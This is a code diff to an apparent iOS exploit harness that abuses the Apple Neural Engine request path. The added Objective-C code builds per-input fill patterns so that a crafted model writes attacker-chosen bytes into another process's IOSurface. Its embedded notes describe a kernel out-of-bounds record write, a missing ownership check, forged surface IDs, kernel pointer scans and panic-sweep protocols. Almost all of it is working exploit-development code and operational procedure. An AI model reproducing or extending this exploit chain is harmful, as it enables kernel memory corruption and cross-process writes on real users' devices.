@@ -154,7 +154,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v62-target-fill-forensics"
+#define P044_BUILD @"p044-v63-copyout-chosenwrite"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -494,6 +494,12 @@ static double   g_expectedSum;     /* v59: CoreML-lane expected sum, for output-
 static uint32_t p044TargetSidOverride;
 static int      p044FillTileValid;
 static uint16_t p044FillTile;
+/* v63 per-input tile pattern (copyout model): p044_fill.txt may be a comma
+   list of up to 127 hex u16 tiles — input i tiled with pattern[i] so the
+   XVRC27_127in_copyout output = the chosen 512-byte pattern at the target.
+   Single value => uniform (v62 behavior). 0 count => default byte fill. */
+static uint16_t p044FillPattern[127];
+static int      p044FillPatternCount;
 
 /* v62 GUEST-HOLD state (session-persistent — deliberately NOT reset by
    cls_reset; the guest app must hold its magic surface alive across taps
@@ -524,6 +530,7 @@ static void cls_reset(void) {
     g_expectedSum = NAN;
     p044TargetSidOverride = 0;
     p044FillTileValid = 0; p044FillTile = 0;
+    p044FillPatternCount = 0; memset(p044FillPattern, 0, sizeof(p044FillPattern));
 }
 
 static void kptr_scan(uint8_t *buf, uint32_t victim, NSMutableString *out) {
@@ -876,7 +883,13 @@ static int p044_ane_build_request(NSMutableString *out) {
             [out appendFormat:@"  input surface %u create failed\n", i];
             return 0;
         }
-        if (p044FillTileValid) {
+        /* v63 per-input tile: pattern[i] when a comma list was given, else
+           the single uniform tile. copyout output[i] = input_i's tile, so a
+           127-value list writes a chosen 254-byte pattern (tiled to 512). */
+        uint16_t tileI = p044FillTile;
+        if (p044FillPatternCount > 0)
+            tileI = p044FillPattern[i % p044FillPatternCount];
+        if (p044FillTileValid || p044FillPatternCount > 0) {
             /* v62 CHOSEN-VALUE FILL: overwrite the whole input with the 2-byte
                fp16 tile T (LE). Uniform tile => min(model) output = exactly T
                at the output base => the sid-write carries CHOSEN content.
@@ -887,8 +900,8 @@ static int p044_ane_build_request(NSMutableString *out) {
                 size_t n = p044_sfAllocSz(s);
                 if (b && n) {
                     for (size_t o = 0; o + 1 < n; o += 2) {
-                        b[o] = (uint8_t)(p044FillTile & 0xff);
-                        b[o + 1] = (uint8_t)(p044FillTile >> 8);
+                        b[o] = (uint8_t)(tileI & 0xff);
+                        b[o + 1] = (uint8_t)(tileI >> 8);
                     }
                 }
                 p044_sfUnlock(s, 0, NULL);
@@ -1777,6 +1790,7 @@ static void *watch_worker(void *arg) {
     [out appendString:@"v57 sidreval (note 129 risk + 130 plan): staged sids 161..878 overlap the census band 162–610, and the out target is picked PRE-CREATION — if the picked surface dies before the build, a NEW surface (ours or system) inherits its sid and the lane silently writes OUR memory. v57 re-validates the lane AFTER all surfaces are created: resolved object must not CFEqual any of our staged surfaces, size must still be 0x4000, and the pre-fire snapshot + useCount are re-taken at arm time so the pre/post diff measures only the fire. Look for [v57] OUTPUT-SID LANE ARMED (clean) vs [v57] SID ALIAS (dropped — census target was recycled). Also next run: capture the KERNEL log during the fire — 'MemoryMapRequest for 255 buffers, result: 0xe00002c2' printing for OUR request decides marshaling-count vs sid-validation as the 0x2/0x9 reject (note 130).\n"];
     [out appendString:@"v58 sweep scaffold (note 130 Phase K1): write N to /var/mobile/Documents/p044_req_in.txt (one line) before tapping P044 — this tap fires with N inputs instead of 254 and the file is consumed (one file = one deliberate fire, no persistence across force-quits). Sweep protocol: N = 193, 196, 200, 224, 255; (N-192) = records CheckandPrewire writes PAST kalloc.3072. Goal: max N that completes without panic + kernel-log capture each run. With N != 254 the out-entry moves off symbolIndex 254 / body+0x444 — the pattern scan ({outSid,0,1,2}) still finds it.\n"];
     [out appendString:@"v62 closed-loop scaffold (note 161 follow-up): three new app-Documents files, ALL consumed on read — (1) p044_target.txt = decimal IOSurfaceGetID of the surface that receives the ANE output (LC-guest loop: guest writes its own GetID here); (2) p044_fill.txt = hex u16 fp16 tile (e.g. 4141) — every A input is tile-filled so the min model's output = exactly this u16 at the target base (CHOSEN content); (3) forensics sidecars now written automatically: p044_census_<sid>.bin (full 16384 B of each 0x4000 foreign hit, cap 12) + p044_target_pre.bin (file-target pre-fire full dump). New round-trip diagnostics: [for] lines now log rt=GetID(lookup(arg)) — the 128-fire 310→312535552 anomaly gets settled this tap; if the file target's round-trip is broken the lane DROPS (no honest aim). GUEST-LOOP PROTOCOL (single binary, two installs): GUEST install — push p044_guest.txt to ITS Documents, tap once = GUEST HOLD (surface tiled 0x4B1D created + held; sid in log; keep app background-alive); pull that sid, push as p044_target.txt into the STANDALONE app along with p044_fill.txt=<different tile e.g. 5eaf> + p044_req_in.txt=127 + p044_model.txt=<min model>, tap standalone = the fire; STANDALONE evidence: p044_target_pre.bin must show the guest's magic tile at that sid (round-trip gate must pass); GUEST observe — tap the guest again with p044_guest.txt: p044_guest_after.bin + base u16 != pre-tile at base with rest still uniform = CROSS-PROCESS CHOSEN-CONTENT WRITE proven.\n"];
+    [out appendString:@"v63 copyout chosen-write (note 163 ladder #2): bundled XVRC27_127in_copyout — output[i] = input_i's fp16 tile VERBATIM (127 identity ops -> concat, spec-7 fp16 output). Set Documents/p044_model.txt=XVRC27_127in_copyout + p044_req_in.txt=127 + p044_target.txt=<sid>, and p044_fill.txt as a COMMA LIST of up to 127 hex u16 tiles (e.g. 4141,4242,4343,...) => the ANE DMAs the chosen pattern (up to 254 B, tiled to 512 B) into the target surface base. Single fill value => uniform 512 B. This is the chosen-content MULTI-BYTE write the consumer's cold-path (no ownership check, note 163) delivers into any resolvable sid. RE proof: prewire 0x874c070 marshals [sid][flag][1][1] w/o bounds check (>192 = 43748 OOB); consumer 0x874c7f4 gates >128 records + plane count/size/circularBuffer, cold-path IOSurface lookup 0x9867f18 has NO per-request ownership check — gated only by the systemwide global-insecure-lookup flag.\n"];
     [out appendString:@"v60 passthrough (Oct-12 20:23): XVRC27_254in_passthrough — same fire, same OUTPUT-SID lane, same census/stillness/out-entry scan; ONLY the model changes (addchain -> passthrough). The 23F77 reject (status=0x2 statusType=0x9 Program Inference error) + the rig's pred=FAILED (accepted, only the 2-byte 0x6a58 header landed) are split by this run: program-complexity cause -> ACCEPTED here (fill + foreign write in ONE fire on 23F77); input-count cause -> rejected again (next vehicle = B model 127in + 1out = 128 records, NO overflow, inference proven to complete on 23F77 y=613 — the foreign OUTPUT sid rides the in-bounds OUTPUT record through the size/symbol gates). Oracles: foreign full-surface pre/post diff + useCount + OUR input fill pattern (0x41..0x50 words) in the foreign surface = OUR content in THEIR memory + sidecar p044_outdump.bin.\n"];
     [out appendString:@"v49 outcome (09:41): BAR HALF ONE PASSED - 62 forged sids {870..931, 0xc0..0xfd} received back from a LIVE port-kind victim at body+0x64..0x434 = exactly the tile end. Fill starts at victim body+0x64; desc-region forge (copyout reject) is the same landing 0x48 earlier. Field-window math (note 118 s3): type==0 never forms from {sid,0xcN,1,1}; desc conversion needs a different record pattern - the consume path is the door.\n"];
     [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
@@ -1859,6 +1873,32 @@ static void *watch_worker(void *arg) {
         NSString *s = [NSString stringWithContentsOfFile:flPath
                                                 encoding:NSUTF8StringEncoding error:NULL];
         if (s) {
+            /* v63: comma list of hex u16 tiles => per-input pattern (copyout
+               model writes the chosen pattern). Single value => uniform. */
+            NSArray *parts = [s componentsSeparatedByString:@","];
+            if (parts.count > 1) {
+                int cnt = 0;
+                for (NSString *p in parts) {
+                    if (cnt >= 127) break;
+                    NSString *h = [[p componentsSeparatedByCharactersInSet:
+                        [[NSCharacterSet alphanumericCharacterSet] invertedSet]]
+                        componentsJoinedByString:@""];
+                    if ([h.lowercaseString hasPrefix:@"0x"]) h = [h substringFromIndex:2];
+                    if (h.length < 1 || h.length > 4) continue;
+                    uint32_t v = (uint32_t)strtoul(h.UTF8String, NULL, 16);
+                    if (v > 0xffff) continue;
+                    p044FillPattern[cnt++] = (uint16_t)v;
+                }
+                if (cnt > 0) {
+                    p044FillPatternCount = cnt;
+                    p044FillTileValid = 1; /* engage the fill path */
+                    p044FillTile = p044FillPattern[0];
+                    [out appendFormat:@"  [v63] FILL PATTERN=%d tiles (first=0x%04x; copyout writes chosen %d-byte pattern)\n",
+                        cnt, p044FillPattern[0], cnt * 2];
+                } else {
+                    [out appendString:@"  [v63] p044_fill.txt comma list had no usable u16 — default fill kept\n"];
+                }
+            } else {
             NSString *hex = [[s componentsSeparatedByCharactersInSet:
                 [[NSCharacterSet alphanumericCharacterSet] invertedSet]]
                 componentsJoinedByString:@""];
@@ -1870,6 +1910,7 @@ static void *watch_worker(void *arg) {
                 [out appendFormat:@"  [v62] FILL TILE=0x%04x (from app Documents/p044_fill.txt; file consumed — chosen fp16 output)\n", p044FillTile];
             } else {
                 [out appendString:@"  [v62] p044_fill.txt present but not a u16 hex tile — default 0x41..0x50 fill kept\n"];
+            }
             }
             unlink(flPath.fileSystemRepresentation);
         }
